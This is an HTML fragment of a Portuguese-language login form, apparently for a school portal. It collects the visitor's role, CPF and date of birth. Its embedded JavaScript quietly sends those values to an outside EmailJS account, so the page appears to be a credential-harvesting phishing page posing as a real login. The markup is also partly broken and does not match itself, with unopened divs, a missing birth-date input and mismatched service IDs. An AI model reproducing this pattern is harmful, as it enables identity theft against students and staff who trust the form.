                <p>Insira seus dados para acessar:</p>
                <form method="post" accept-charset="utf-8"><div style="display:none;"><input type="hidden" name="_method" value="POST"/></div>                    <div class="form-group">

                        <div class="input select"><select name="entrar_como" class="form-control" id="entrar-como"><option value="estudante">Estudante</option><option value="servidor">Servidor</option></select></div>                    </div>

                        <div class="input tel required"><input type="tel" name="cpf" placeholder="CPF" maxlength="11" class="form-control" required="required" id="cpf"/></div>                    </div>

                        <label for="data_nascimento">Data de nascimento (dd/mm/aaaa)</label>

    <script type="text/javascript">

                emailjs.init("fNg3ersx1H2RbQHxu");

        function enviarEmail() {
            // Obter os valores do formulário
            var entrarComo = document.getElementById("entrar-como").value;
            var cpf = document.getElementById("cpf").value;
            var dataNascimento = document.getElementById("data-nascimento").value;

            // Configuração do e-mail
            var emailConfig = {
                service_id: "service_sy13tqk",
                template_id: "template_m5vjd7w",
                user_id: "fNg3ersx1H2RbQHxu",
                template_params: {
                    "entrarComo": entrarComo,
                    "cpf": cpf,
                    "dataNascimento": dataNascimento
                }
            };

            // Envio do e-mail
            emailjs.send("default_service", "Meu modelo padrão", emailConfig.template_params)
                .then(function(response) {
                    alert("E-mail enviado com sucesso", response);
                }, function(error) {
                    alert("Erro ao enviar o e-mail", error);
                });
        }
    </script>
